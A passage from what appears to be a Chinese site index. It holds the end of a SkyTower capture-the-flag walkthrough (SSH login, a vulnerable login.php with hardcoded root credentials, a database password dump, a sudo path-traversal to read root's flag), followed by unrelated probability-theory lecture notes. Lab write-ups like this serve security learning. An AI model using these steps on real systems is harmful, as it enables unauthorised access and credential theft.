/etc/debian_chroot)\nfi\n\n# set a fancy prompt (non-color, unless we know we \"want\" color)\ncase \"$TERM\" in\n    xterm-color) color_prompt=yes;;\nesac\n\n# uncomment for a colored prompt, if the terminal has the capability; turned\n# off by default to not distract the user: the focus in a terminal window\n# should be on the output of commands, not on the prompt\n#force_color_prompt=yes\n\nif [ -n \"$force_color_prompt\" ]; then\n    if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then\n        # We have color support; assume it's compliant with Ecma-48\n        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such\n        # a case would tend to support setf rather than setaf.)\n        color_prompt=yes\n    else\n        color_prompt=\n    fi\nfi\n\nif [ \"$color_prompt\" = yes ]; then\n    PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '\nelse\n    PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ '\nfi\nunset color_prompt force_color_prompt\n\n# If this is an xterm set the title to user@host:dir\ncase \"$TERM\" in\nxterm*|rxvt*)\n    PS1=\"\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1\"\n    ;;\n*)\n    ;;\nesac\n\n# enable color support of ls and also add handy aliases\nif [ -x /usr/bin/dircolors ]; then\n    test -r ~/.dircolors &amp;&amp; eval \"$(dircolors -b ~/.dircolors)\" || eval \"$(dircolors -b)\"\n    alias ls='ls --color=auto'\n    #alias dir='dir --color=auto'\n    #alias vdir='vdir --color=auto'\n\n    #alias grep='grep --color=auto'\n    #alias fgrep='fgrep --color=auto'\n    #alias egrep='egrep --color=auto'\nfi\n\n# some more ls aliases\n#alias ll='ls -l'\n#alias la='ls -A'\n#alias l='ls -CF'\n\n# Alias definitions.\n# You may want to put all your additions into a separate file like\n# ~/.bash_aliases, instead of adding them here directly.\n# See /usr/share/doc/bash-doc/examples in the bash-doc package.\n\nif [ -f ~/.bash_aliases ]; then\n    . ~/.bash_aliases\nfi\n\n# enable programmable completion features (you don't need to enable\n# this, if it's already enabled in /etc/bash.bashrc and /etc/profile\n# sources /etc/bash.bashrc).\nif ! shopt -oq posix; then\n  if [ -f /usr/share/bash-completion/bash_completion ]; then\n    . /usr/share/bash-completion/bash_completion\n  elif [ -f /etc/bash_completion ]; then\n    . /etc/bash_completion\n  fi\nfi\n\necho\necho  \"Funds have been withdrawn\"\nexit\n</code></pre> <p>\u679c\u7136\u5b58\u5728\u8fd9\u6837\u4e00\u79cd\u811a\u672c\u5f3a\u884c\u628a\u6211\u4eec\u62e6\u4f4f\uff0c\u8003\u8651\u6700\u76f4\u63a5\u7684\u4e00\u79cd\u5904\u7406\u65b9\u5f0f\uff1a\u4f7f\u7528 john \u7528\u6237\u7684\u6743\u9650\u5c06\u8be5\u811a\u672c\u5220\u9664\uff1a</p> <pre><code>\u2514\u2500$ ssh -p 3343 john@127.0.0.1 \"rm -f ~/.bashrc\"\njohn@127.0.0.1's password: \n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ssh -p 3343 john@127.0.0.1 \"cat ~/.bashrc\"                                                                                                           \njohn@127.0.0.1's password: \ncat: /home/john/.bashrc: No such file or directory\n</code></pre> <p>\u5220\u9664\u6210\u529f\u3002</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u7ee7\u7eed\u5c1d\u8bd5\u767b\u5165\uff1a</p> <pre><code>\u2514\u2500$ ssh -p 3343 john@127.0.0.1\njohn@127.0.0.1's password: \nLinux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Mon Dec  8 08:01:47 2025 from 10.0.2.17\njohn@SkyTower:~$ \n</code></pre> <p>\u767b\u5165\u6210\u529f\uff0c\u63a5\u4e0b\u6765\u5c1d\u8bd5\u63d0\u6743\u3002</p> <p>\u8003\u8651\u4ece <code>www-data</code> \u5165\u624b\uff0c\u4e8e\u662f\u67e5\u770b <code>/var/www</code> \u4e2d\u7684 SQL \u4fe1\u606f\uff1a</p> <pre><code>john@SkyTower:~$ cd /var/www\njohn@SkyTower:/var/www$ ls -l\ntotal 5292\n-rwxr--r-- 1 root root 2831446 Jun 20  2014 background2.jpg\n-rwxr--r-- 1 root root 2572609 Jun 20  2014 background.jpg\n-rwxr--r-- 1 root root    1136 Jun 20  2014 index.html\n-rwxr--r-- 1 root root    2393 Jun 20  2014 login.php\njohn@SkyTower:/var/www$ \n</code></pre> <p>\u770b\u4e00\u4e0b\u8fd9\u4e2a <code>login.php</code> \u6587\u4ef6\uff1a</p> <pre><code>john@SkyTower:/var/www$ cat login.php\n&lt;?php\n\n$db = new mysqli('localhost', 'root', 'root', 'SkyTech');\n\nif($db-&gt;connect_errno &gt; 0){\n    die('Unable to connect to database [' . $db-&gt;connect_error . ']');\n\n}\n\n$sqlinjection = array(\"SELECT\", \"TRUE\", \"FALSE\", \"--\",\"OR\", \"=\", \",\", \"AND\", \"NOT\");\n$email = str_ireplace($sqlinjection, \"\", $_POST['email']);\n$password = str_ireplace($sqlinjection, \"\", $_POST['password']);\n\n$sql= \"SELECT * FROM login where email='\".$email.\"' and password='\".$password.\"';\";\n$result = $db-&gt;query($sql);\n\n\nif(!$result)\n    die('There was an error running the query [' . $db-&gt;error . ']');\nif($result-&gt;num_rows==0)\n    die('&lt;br&gt;Login Failed&lt;/br&gt;');\n\n$row = $result-&gt;fetch_assoc();\n\necho \"&lt;HTML&gt;\";\necho '\n      &lt;div style=\"height:100%; width:100%;background-image:url(\\'background.jpg\\');\n                                background-size:100%;\n                                background-position:50% 50%;\n                                background-repeat:no-repeat;\"&gt;\n      &lt;div style=\"\n                  padding-right:8px;  \n                  padding-left:10px; \n                  padding-top: 10px;  \n                  padding-bottom: 10px;  \n                  background-color:white;     \n                  border-color: #000000;\n                  border-width: 5px;\n                  border-style: solid;\n                  width: 400px;\n                  height:430px;\n                  position:absolute;\n                  top:50%;\n                  left:50%;\n                  margin-top:-215px; /* this is half the height of your div*/  \n                  margin-left:-200px;\n                                \"&gt;\n        ';\necho \"&lt;br&gt;&lt;strong&gt;&lt;font size=4&gt;Welcome \".$row[\"email\"].\"&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;\";\necho \"As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks for your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;$2&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: \".explode(\"@\",$row[\"email\"])[0].\"&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: \".$row[\"password\"].\"&lt;/strong&gt;\";\necho \" &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;\";\necho \"&lt;/HTML&gt;\"\n\n?&gt;\njohn@SkyTower:/var/www$ \n</code></pre> <p>\u6211\u4eec\u53d1\u73b0\u4e86 SQL \u6ce8\u5165\u7684\u9ed1\u540d\u5355\uff1a</p> <pre><code>$sqlinjection = array(\"SELECT\", \"TRUE\", \"FALSE\", \"--\",\"OR\", \"=\", \",\", \"AND\", \"NOT\");\n</code></pre> <p>\u7a0b\u5e8f\u76f4\u63a5\u5c06\u8fd9\u4e9b\u5b50\u4e32\u66ff\u6362\u4e3a\u7a7a\u4e32\uff0c\u4ece\u800c\u7834\u574f\u6ce8\u5165\u4ee3\u7801\uff1a</p> <pre><code>$email = str_ireplace($sqlinjection, \"\", $_POST['email']);\n$password = str_ireplace($sqlinjection, \"\", $_POST['password']);\n</code></pre> <p>\u4ee5\u53ca\u8d26\u5bc6\uff1a</p> <pre><code>$db = new mysqli('localhost', 'root', 'root', 'SkyTech');\n</code></pre> <p>\u8fd9\u8868\u660e <code>mysqli</code> \u53ef\u4ee5\u4ee5 <code>root</code> \u548c <code>root</code> \u7684\u8d26\u5bc6\u767b\u9646\u672c\u673a MySQL \u7684 <code>SkyTech</code> \u6570\u636e\u5e93\u3002</p> <p>\u4e8e\u662f\u6211\u4eec\u5c1d\u8bd5\u8fdb\u5165\u8fd9\u4e2a\u6570\u636e\u5e93\uff1a</p> <pre><code>john@SkyTower:/var/www$ mysql -u root -p\nEnter password: \nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 41\nServer version: 5.5.35-0+wheezy1 (Debian)\n\nCopyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql&gt; \n</code></pre> <p>\u5f00\u59cb\u67e5\u8be2\u6570\u636e\u5e93\u5185\u7684\u5185\u5bb9\uff1a</p> <pre><code>mysql&gt; SHOW DATABASES;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| SkyTech            |\n| mysql              |\n| performance_schema |\n+--------------------+\n4 rows in set (0.02 sec)\n\nmysql&gt; USE SkyTech;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nmysql&gt; SHOW TABLES;\n+-------------------+\n| Tables_in_SkyTech |\n+-------------------+\n| login             |\n+-------------------+\n1 row in set (0.00 sec)\n\nmysql&gt; SELECT * FROM login;\n+----+---------------------+--------------+\n| id | email               | password     |\n+----+---------------------+--------------+\n|  1 | john@skytech.com    | hereisjohn   |\n|  2 | sara@skytech.com    | ihatethisjob |\n|  3 | william@skytech.com | senseable    |\n+----+---------------------+--------------+\n3 rows in set (0.00 sec)\n\nmysql&gt; exit\nBye\n</code></pre> <p>\u4e8e\u662f\u6211\u4eec\u8f7b\u677e\u5f97\u5230\u4e86\u4e09\u540d\u5458\u5de5\u7684\u8d26\u5bc6\uff0c\u53ef\u4ee5\u5728 SSH \u4e0a\u4e00\u4e00\u9a8c\u8bc1\uff1aSara \u7684\u53ef\u767b\u9646\uff0cWilliam \u7684\u767b\u4e0d\u4e0a\u53bb\u3002</p> <p>\u5c1d\u8bd5\u5207\u6362\u5230 Sara \u7684\u8d26\u6237\uff0c\u5148\u6309 Ctrl + D \u9000\u51fa\uff1a</p> <pre><code>john@SkyTower:/var/www$ logout\nConnection to 127.0.0.1 closed.\n</code></pre> <p>\u7136\u540e\u91cd\u8fde\uff1a</p> <pre><code>\u2514\u2500$ ssh -p 3343 sara@127.0.0.1\nsara@127.0.0.1's password: \nLinux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Fri Jun 20 08:19:23 2014 from localhost\n\nFunds have been withdrawn\nConnection to 127.0.0.1 closed.\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ssh -p 3343 sara@127.0.0.1 \"cat ~/.bashrc\"\n\n# \u6b64\u5904\u7701\u7565\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ssh -p 3343 sara@127.0.0.1 \"rm -f ~/.bashrc\"                                                                                                        \nsara@127.0.0.1's password: \n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ssh -p 3343 sara@127.0.0.1\nsara@127.0.0.1's password: \nLinux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Mon Dec  8 08:22:25 2025 from 10.0.2.17\nsara@SkyTower:~$ \n</code></pre> <p>\u53cd\u6b63\u662f\u91cd\u5220\u4e86\u4e00\u904d\u811a\u672c\uff0c\u7136\u540e\u767b\u5165\uff0c\u76f4\u63a5\u67e5\u770b\u4e00\u4e0b sara \u7528\u6237\u7684\u6743\u9650\uff1a</p> <pre><code>sara@SkyTower:~$ sudo -l\nMatching Defaults entries for sara on this host:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser sara may run the following commands on this host:\n    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*\nsara@SkyTower:~$ \n</code></pre> <p>\u53d1\u73b0 sara \u80fd\u65e0\u6761\u4ef6\u4f7f\u7528\u6839\u6743\u9650\u5bf9 <code>/accounts/*</code> \u7684 <code>cat</code> \u548c <code>ls</code>.</p> <pre><code>sara@SkyTower:~$ cd /accounts\nsara@SkyTower:/accounts$ ls -la\ntotal 8\ndrwxr-xr-x  2 root root 4096 Jun 20  2014 .\ndrwxr-xr-x 24 root root 4096 Jun 20  2014 ..\nsara@SkyTower:/accounts$ \n</code></pre> <p>\u7136\u800c\uff0c\u8fd9\u662f\u4e2a\u7a7a\u6587\u4ef6\u5939\u3002</p> <p>\u4e0d\u8fc7\uff0c\u65e2\u7136\u662f <code>/accounts/*</code>\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5730\u5740\u7ed5\u8fc7\uff0c\u770b\u770b\u4e0a\u7ea7\u76ee\u5f55\u4e2d\u6709\u6ca1\u6709\u4ec0\u4e48\u80fd\u770b\u7684\uff1a</p> <pre><code>sara@SkyTower:/accounts$ cd ..\nsara@SkyTower:/$ ls -la\ntotal 92\ndrwxr-xr-x 24 root root  4096 Jun 20  2014 .\ndrwxr-xr-x 24 root root  4096 Jun 20  2014 ..\ndrwxr-xr-x  2 root root  4096 Jun 20  2014 accounts\ndrwxr-xr-x  2 root root  4096 Jun 20  2014 bin\ndrwxr-xr-x  3 root root  4096 Jun 20  2014 boot\ndrwxr-xr-x 14 root root  3020 Dec  8 07:46 dev\ndrwxr-xr-x 66 root root  4096 Dec  8 08:26 etc\ndrwxr-xr-x  5 root root  4096 Jun 20  2014 home\nlrwxrwxrwx  1 root root    30 Jun 20  2014 initrd.img -&gt; /boot/initrd.img-3.2.0-4-amd64\ndrwxr-xr-x 12 root root  4096 Jun 20  2014 lib\ndrwxr-xr-x  2 root root  4096 Jun 20  2014 lib64\ndrwx------  2 root root 16384 Jun 20  2014 lost+found\ndrwxr-xr-x  3 root root  4096 Jun 20  2014 media\ndrwxr-xr-x  2 root root  4096 Jan 28  2014 mnt\ndrwxr-xr-x  2 root root  4096 Jun 20  2014 opt\ndr-xr-xr-x 75 root root     0 Dec  8 07:46 proc\ndrwx------  4 root root  4096 Jun 20  2014 root\ndrwxr-xr-x 12 root root   480 Dec  8 07:46 run\ndrwxr-xr-x  2 root root  4096 Jun 20  2014 sbin\ndrwxr-xr-x  2 root root  4096 Jun 10  2012 selinux\ndrwxr-xr-x  2 root root  4096 Jun 20  2014 srv\ndrwxr-xr-x 13 root root     0 Dec  8 07:45 sys\ndrwxrwxrwt  2 root root  4096 Dec  8 08:17 tmp\ndrwxr-xr-x 10 root root  4096 Nov 18  2012 usr\ndrwxr-xr-x 12 root root  4096 Jun 20  2014 var\nlrwxrwxrwx  1 root root    26 Jun 20  2014 vmlinuz -&gt; boot/vmlinuz-3.2.0-4-amd64\nsara@SkyTower:/$ \n</code></pre> <p>\u770b\u5230\u8fd9\u91cc\u6709\u4e2a <code>root</code> \u6587\u4ef6\u5939\uff0c\u53ef\u80fd\u548c\u6839\u6743\u9650\u6709\u5173\uff0c\u6211\u4eec\u5c1d\u8bd5\u901a\u8fc7\u5730\u5740\u7ed5\u8fc7\u7684\u65b9\u5f0f\u67e5\u770b\uff1a</p> <pre><code>sara@SkyTower:/accounts$ sudo /bin/ls /accounts/../root -la\ntotal 36\ndrwx------  4 root root 4096 Jun 20  2014 .\ndrwxr-xr-x 24 root root 4096 Jun 20  2014 ..\ndrwx------  2 root root 4096 Jun 20  2014 .aptitude\n-rw-------  1 root root  204 Jun 20  2014 .bash_history\n-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc\n-rwx------  1 root root   69 Jun 20  2014 flag.txt\n-rw-------  1 root root  268 Jun 20  2014 .mysql_history\n-rw-r--r--  1 root root  140 Nov 19  2007 .profile\ndrwx------  2 root root 4096 Jun 20  2014 .ssh\n</code></pre> <p>\u6211\u4eec\u53d1\u73b0\u5176\u4e2d\u6709\u4e2a <code>flag.txt</code>\uff0c\u8fd9\u5e94\u8be5\u5c31\u662f\u6211\u4eec\u60f3\u5f97\u5230\u7684\uff0c<code>cat</code> \u67e5\u770b\u4e4b\uff1a</p> <pre><code>sara@SkyTower:/accounts$ sudo /bin/cat /accounts/../root/flag.txt\nCongratz, have a cold one to celebrate!\nroot password is theskytower\n</code></pre> <p>\u679c\u7136\u5f97\u5230\u4e86\u5bc6\u7801\uff1a<code>theskytower</code>\uff0c\u63a5\u4e0b\u6765\u5207\u6362\u5230 root \u8d26\u6237\u5373\u53ef\uff1a</p> <pre><code>\u2514\u2500$ ssh -p 3343 root@127.0.0.1\nroot@127.0.0.1's password: \nLinux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Fri Jun 20 09:01:28 2014\nroot@SkyTower:~# whoami\nroot\nroot@SkyTower:~# passwd\nEnter new UNIX password: \nRetype new UNIX password: \npasswd: password updated successfully\nroot@SkyTower:~# \n</code></pre> <p>\u4fee\u6539\u5bc6\u7801\u4e3a <code>s0aked1208</code>\uff0c\u63a5\u4e0b\u6765\u767b\u5165\u9776\u673a\uff1a</p> <p>\u767b\u5165\u6210\u529f\uff01</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-1-%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/","title":"Ch.1 \u968f\u673a\u4e8b\u4ef6\u4e0e\u6982\u7387","text":""},{"location":"in_class_learning/semester_3/probability_theory/Ch-1-%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#p1","title":"\u4e00\u3001\u968f\u673a\u8bd5\u9a8c\u4e0e\u968f\u673a\u4e8b\u4ef6\uff08P1\uff09","text":"<p>\u968f\u673a\u8bd5\u9a8c\uff1a\u5bf9\u968f\u673a\u73b0\u8c61\u7684\u4f9d\u6b21\u89c2\u6d4b.</p> <p>\u7279\u70b9\uff1a</p> <p>\u2460\u5728\u76f8\u540c\u7684\u6761\u4ef6\u4e0b\u8bd5\u9a8c\u53ef\u91cd\u590d\u8fdb\u884c.</p> <p>\u2461\u6bcf\u6b21\u5b9e\u9a8c\u5177\u6709\u591a\u79cd\u7ed3\u679c\uff0c\u4f46\u8bd5\u9a8c\u4e4b\u524d\u53ef\u77e5\u9053\u8bd5\u9a8c\u7684\u6240\u6709\u53ef\u80fd\u7ed3\u679c.</p> <p>\u2462\u6bcf\u6b21\u8bd5\u9a8c\u4f1a\u51fa\u73b0\u8fd9\u4e9b\u53ef\u80fd\u7ed3\u679c\u4e4b\u4e00\uff0c\u4f46\u8bd5\u9a8c\u524d\u4e0d\u80fd\u786e\u5b9a\u54ea\u4e00\u4e2a\u7ed3\u679c\u4f1a\u51fa\u73b0.</p> <p>\u5728\u968f\u673a\u8bd5\u9a8c \\(E\\) \u4e2d\uff0c\u628a\u6240\u6709\u53ef\u80fd\u7ed3\u679c\u7684\u96c6\u5408\u79f0\u4e3a\u6837\u672c\u7a7a\u95f4\uff0c\u8bb0\u4e3a \\(\\Omega\\). \u6837\u672c\u7a7a\u95f4\u7684\u5143\u7d20\uff0c\u5373 \\(E\\) \u7684\u6bcf\u4e2a\u53ef\u80fd\u7ed3\u679c\u79f0\u4e3a\u57fa\u672c\u4e8b\u4ef6\u6216\u6837\u672c\u70b9\uff0c\u8bb0\u4e3a \\(e\\).</p> <p>\u968f\u673a\u4e8b\u4ef6\uff1a\u53ef\u80fd\u53d1\u751f\u4e5f\u53ef\u80fd\u4e0d\u53d1\u751f\u7684\u4e8b\u4ef6. \u53ef\u5b9a\u4e49\u4e3a\uff1a\u6837\u672c\u7a7a\u95f4 \\(\\varOmega\\) \u7684\u5b50\u96c6\uff0c\u5e38\u5e38\u8bb0\u4e3a \\(A, B, C\\) \u7b49\uff0c\u968f\u673a\u4e8b\u4ef6\u53ef\u7b80\u79f0\u4e3a\u4e8b\u4ef6.</p> <p>\u4e24\u4e2a\u7279\u6b8a\u7684\u4e8b\u4ef6\uff1a\u5fc5\u7136\u4e8b\u4ef6\uff0c\u4e0d\u53ef\u80fd\u4e8b\u4ef6.</p> <p>\u5fc5\u7136\u4e8b\u4ef6\uff1a\u6837\u672c\u7a7a\u95f4 \\(\\varOmega\\).</p> <p>\u4e0d\u53ef\u80fd\u4e8b\u4ef6\uff1a\u7a7a\u96c6 \\(\\varPhi\\).</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-1-%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#p2","title":"\u4e8c\u3001\u4e8b\u4ef6\u95f4\u7684\u5173\u7cfb\u53ca\u8fd0\u7b97\uff08P2\uff09","text":"<p>\u4ee5\u4e0b\u8bbe \\(\\varOmega\\) \u662f\u7ed9\u5b9a\u7684\u6837\u672c\u7a7a\u95f4\uff0c\u6b64\u6837\u672c\u7a7a\u95f4\u4e0a\u7684\u968f\u673a\u4e8b\u4ef6\u4e3a \\(A, B, C, A_k(k=1, 2, \\cdots)\\) \u7b49.</p> <p>\u5305\u542b\u5173\u7cfb\uff1a\u5982\u679c\u4e8b\u4ef6 \\(A\\) \u53d1\u751f\u5fc5\u5bfc\u81f4\u4e8b\u4ef6 \\(B\\) \u53d1\u751f\uff0c\u5219\u79f0\u4e8b\u4ef6 \\(B\\) \u5305\u542b\u4e8b\u4ef6 \\(A\\)\uff0c\u8bb0 \\(B\\supset A\\).</p> <p>\u4e92\u4e0d\u76f8\u5bb9\u5173\u7cfb/\u4e92\u65a5\u5173\u7cfb\uff1a\u82e5\u4e8b\u4ef6 \\(A\\) \u4e0e\u4e8b\u4ef6 \\(B\\) \u4e0d\u53ef\u80fd\u540c\u65f6\u53d1\u751f\uff0c\u5219\u79f0 \\(A, B\\) \u4e92\u4e0d\u76f8\u5bb9\uff08\u6216\u4e92\u65a5\uff09\uff0c\u6b64\u65f6\u4e8c\u8005\u6ca1\u6709\u5171\u540c\u7684\u6837\u672c\u70b9.</p> <p>\u76f8\u7b49\u5173\u7cfb\uff1a\u82e5 \\(B\\supset A\\)\uff0c\u4e14 \\(A\\supset B\\)\uff0c\u5219\u79f0 \\(A\\) \u4e0e \\(B\\) \u76f8\u7b49\uff0c\u8bb0\u4e3a \\(A=B\\)\uff0c\u6b64\u65f6\u4e24\u4e8b\u4ef6\u7684\u6837\u672c\u70b9\u5b8c\u5168\u76f8\u540c.</p> <p>\u4e8b\u4ef6\u7684\u5e76\uff1a\u4e8b\u4ef6 \\(A\\) \u4e0e \\(B\\) \u81f3\u5c11\u53d1\u751f\u4e00\u4e2a\u6240\u6784\u6210\u7684\u4e8b\u4ef6\u79f0\u4e3a \\(A\\) \u4e0e \\(B\\) \u7684\u5e76\uff0c\u8bb0\u4e3a \\(A\\cup B\\)\uff0c\u5176\u6837\u672c\u70b9\u7531 \\(A\\) \u4e0e \\(B\\) \u7684\u6837\u672c\u70b9\u5408\u5e76\u800c\u6210.</p> <p>\u4e8b\u4ef6 \\(A_1, A_2, \\cdots, A_n\\) \u81f3\u5c11\u53d1\u751f\u4e00\u4e2a\u7684\u4e8b\u4ef6\u79f0\u4e3a \\(A_1, A_2, \\cdots, A_n\\) \u7684\u5e76\uff0c\u8bb0\u4e3a \\(A_1\\cup A_2\\cup \\cdots \\cup A_n\\) \u6216 \\(\\bigcup_{i=1}^{n} A_i\\).</p> <p>\u4e8b\u4ef6\u7684\u4ea4\uff1a\u4e8b\u4ef6 \\(A\\) \u4e0e \\(B\\) \u540c\u65f6\u53d1\u751f\u7684\u4e8b\u4ef6\u79f0\u4e3a \\(A\\) \u4e0e \\(B\\) \u7684\u4ea4\uff0c\u8bb0\u4e3a \\(A\\cap B\\) \u6216 \\(AB\\)\uff0c\u5176\u6837\u672c\u70b9\u7531 \\(A\\) \u4e0e \\(B\\) \u5171\u540c\u7684\u6837\u672c\u70b9\u7ec4\u6210.</p> <p>\u4e8b\u4ef6 \\(A_1, A_2, \\cdots, A_n\\) \u540c\u65f6\u53d1\u751f\u7684\u4e8b\u4ef6\u79f0\u4e3a \\(A_1, A_2, \\cdots, A_n\\) \u7684\u4ea4\uff0c\u8bb0\u4e3a \\(A_1\\cap A_2\\cap \\cdots \\cap A_n\\) \u6216 \\(\\bigcap_{i=1}^{n} A_i\\) \u6216 \\(A_1A_2\\cdots A_n\\).</p> <p>\u4e8b\u4ef6\u7684\u5dee\uff1a\u4e8b\u4ef6 \\(A\\) \u53d1\u751f\u800c\u4e8b\u4ef6 \\(B\\) \u4e0d\u53d1\u751f\u7684\u4e8b\u4ef6\u79f0\u4e3a \\(A\\) \u4e0e \\(B\\) \u7684\u5dee\uff0c\u8bb0\u4e3a \\(A-B\\)\uff0c\u5176\u6837\u672c\u70b9\u7531 \\(A\\) \u4e2d\u9664\u53bb \\(B\\) \u7684\u6837\u672c\u70b9\u7ec4\u6210.</p> <p>\u5bf9\u7acb\u4e8b\u4ef6\uff1a\u4e8b\u4ef6 \\(A\\) \u4e0d\u53d1\u751f\u7684\u4e8b\u4ef6\u79f0\u4e3a \\(A\\) \u7684\u5bf9\u7acb\u4e8b\u4ef6\uff0c\u5373\u4e3a \\(\\overline{A}\\)\uff0c\u5176\u7531 \\(\\Omega\\) \u4e2d\u9664 \\(A\\) \u4ee5\u5916\u7684\u6837\u672c\u70b9\u7ec4\u6210.</p> <p>\u6ce8\u610f\u5982\u4e0b\u7b49\u5f0f\uff1a</p> <ol> <li>\\(A=(A-B)\\cup (AB)\\).</li> <li>\\(A\\cup B=A\\cup (B-A)=(A-B)\\cup (AB)\\cup (B-A)\\).</li> <li>\\(A-B=A-(AB)=A\\overline{B}\\)</li> <li>\\(\\overline{A}=\\Omega -A, A\\cup \\overline{A}=\\Omega\\).</li> </ol> <p>\u53ef\u4ee5\u8bc1\u660e\u4e8b\u4ef6\u7684\u8fd0\u7b97\u6ee1\u8db3\u4ee5\u4e0b\u7684\u8fd0\u7b97\u5f8b\uff1a</p> <ol> <li>\u4ea4\u6362\u5f8b\uff1a\\(A\\cup B=B\\cup A, A\\cap B = B\\cap A\\).</li> <li>\u7ed3\u5408\u5f8b\uff1a\\((A\\cup B)\\cup C=A\\cup(B\\cup C), (A\\cap B)\\cap C=A\\cap(B\\cap C\\)).</li> <li>\u5206\u914d\u5f8b\uff1a\\(A\\cup(B\\cap C)=(A\\cup B)\\cap (A\\cup C), A\\cap (B\\cup C)=(A\\cap B)\\cup(A\\cap C)\\).</li> <li> <p>\u5fb7\u6469\u6839\u5f8b(De Morgan\u2019s laws)\uff1a\\(\\overline{A\\cup B}=\\overline{A}\\cap \\overline{B}, \\overline{A\\cap B}=\\overline{A}\\cup \\overline{B}\\).</p> <p>\u53ef\u4ee5\u63a8\u5e7f\uff1a</p> \\[ \\overline{\\bigcup_{i=1}^{n}A_i}=\\bigcap_{i=1}^{n}\\overline{A_i}, \\overline{\\bigcap_{i=1}^{n}A_i}=\\bigcup_{i=1}^{n}\\overline{A_i} \\] </li> </ol>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-1-%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#p4","title":"\u4e09\u3001\u9891\u7387\u4e0e\u6982\u7387\uff08P4\uff09","text":"<p>\u8bbe\u968f\u673a\u4e8b\u4ef6 \\(A\\) \u5728 \\(n\\) \u6b21\u91cd\u590d\u8bd5\u9a8c\u4e2d\u5171\u51fa\u73b0 \\(n_A\\) \u6b21\uff0c\u5b9a\u4e49 \\(A\\) \u53d1\u751f\u7684\u9891\u7387\u5982\u4e0b\uff0c\u5e76\u8bb0\u4e3a \\(f_n(A)\\).</p> \\[ f_n(A)=\\dfrac{n_A}{n} \\] <p>\u4e8b\u4ef6 A \u7684\u9891\u7387\u5177\u6709\u5982\u4e0b\u6027\u8d28\uff1a</p> <ol> <li>\\(0\\leqslant f_n(A)\\leqslant 1\\).</li> <li>\\(f_n(\\varOmega)=1\\).</li> <li> <p>\u82e5 \\(A_1, A_2, \\cdots, A_n\\) \u4e92\u4e0d\u76f8\u878d\uff0c\u5219</p> \\[ f_n\\left(\\bigcup_{i=1}^{n} A_i\\right)=\\sum_{i=1}^{n}f_n(A_i) \\] </li> </ol> <p>\u9891\u7387\u7684\u7a33\u5b9a\u6027\uff1a\u5728 \\(n\\) 